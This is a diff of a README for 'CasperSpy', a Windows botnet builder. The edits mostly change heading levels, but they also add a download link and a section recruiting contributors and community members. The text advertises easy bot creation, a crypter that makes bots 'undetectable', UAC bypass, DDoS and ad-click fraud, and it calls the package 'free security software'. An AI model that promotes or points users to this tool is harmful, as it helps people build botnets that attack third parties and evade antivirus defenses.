@@ -13,6 +13,8 @@ All tools in CasperLauncher equipped by Tutorial and Guide How to use it
 so you can easily use any toolkit therein.
 CasperLauncher is distributed in the hope that it will be useful.
 
+## [Download New Release here](https://github.com/dhanumurti/casperspy/releases)
+
 ***
 
 # CasperSpy - Effortless Botnet Builder 
@@ -33,11 +35,15 @@ CasperLauncher is distributed in the hope that it will be useful.
 You can create Bot Instantly using thist tool with Easy Configuration.
 Then make your bot undetectable in our Crypter.
 
-# [Download New Release here](https://github.com/dhanumurti/casperspy/releases)
+## [Download New Release here](https://github.com/dhanumurti/casperspy/releases)
 
 ***
 
-# Scan Result
+## Getting Involved
+
+Want to report a bug, request a feature, contribute or translate CasperSpy or CasperLauncher? Check out our in-depth guide to [Contributing to Casper](https://groups.google.com/forum/#!forum/casperspy). We need all the help we can get! You can also join in with our [community](https://groups.google.com/forum/#!forum/casperspy) to keep up-to-date and meet other CasperFriends.
+
+## Scan Result
 
 Scanning Archive here : https://www.virustotal.com/en/file/e5659ae1a0019052ad2775ad239ed7c297a767f187d9c8546b1d39bb9388b105/analysis/1416241356/
 
@@ -64,7 +70,7 @@ This is the content of **Start.bat** script:
 `pause`
 `start casperlauncher.exe`
 
-# Feature 
+## Feature 
 
 * Ads Clicking.
 * Anti UAC : Bypass (User Account Control) Prevention
@@ -75,7 +81,7 @@ This is the content of **Start.bat** script:
 * DDOS.
 * Plugin : Create your own plugin (additional plugin on progress)
 
-# Minimal system requirements
+## Minimal system requirements
 
 * Windows 98 / 2000 / 2003 / XP / Vista / Win7 / Win 8, 8.1 (same as 32-bit, as 64-bit);
 * CPU 2 GHz, RAM from 2 Gb;
@@ -84,7 +90,7 @@ This is the content of **Start.bat** script:
 
 ***
 
-# DISCLAIMER EULA
+## DISCLAIMER EULA
 
 CasperSpy is a free security software provided by Casperspy.com 
 Copyright (C) 2014 by Sillhouette @casperspy 
@@ -108,4 +114,4 @@ If not, see <http://www.gnu.org/licenses/>.
 NOTE: CasperSpy Official web is suspended. Donation can help me so much to buy new hosting and domain Casperspy.org
 casperspy.botnet@gmail.com
 
-## [Have a Question? or Found a Problem](https://groups.google.com/forum/#!forum/casperspy)
+# [Have a Question? or Found a Problem](https://groups.google.com/forum/#!forum/casperspy)
